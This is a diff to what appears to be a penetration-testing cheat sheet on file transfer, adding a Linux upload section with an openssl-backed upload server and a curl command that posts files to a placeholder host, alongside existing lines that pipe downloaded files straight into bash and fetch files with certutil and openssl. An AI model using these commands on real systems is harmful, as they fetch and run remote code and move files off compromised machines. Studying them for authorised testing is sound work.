@@ -487,7 +487,7 @@ Import-Module bitstransfer; Start-BitsTransfer -Source "http://<host>/<file>" -D
 certutil.exe -verifyctl -split -f http://<host>/<file>
 ```
 
-### Linux File Transfers
+### Linux File Downloads
 #### Downloads with Wget
 ```sh
 wget <Target File URL> -O <path/to/file_save>
@@ -505,6 +505,17 @@ curl <Target File URL> | bash
 wget -q0- <Target File URL> | bash
 ```
 
+### Linux File Uploads
+  1. Start an upload server
+  ```sh
+  openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+  python3 -m uploadserver 443 --server-certificate server.pem
+  ```
+  2. Upload Files
+  ```sh
+  curl -X POST https://<IP> -F 'files=@<file to transfer>' -F 'files=@<file to transfer>' --insecure
+  ```
+
 #### GTFOBINS
 ##### openssl
   1. Create a Certificate on the server machine
@@ -519,8 +530,6 @@ wget -q0- <Target File URL> | bash
   ```sh
   openssl s_client -connect <host>:<port> -quiet > <file>
   ```
-#### File Uploads
-  
   
 ### Pivoting
 ### 
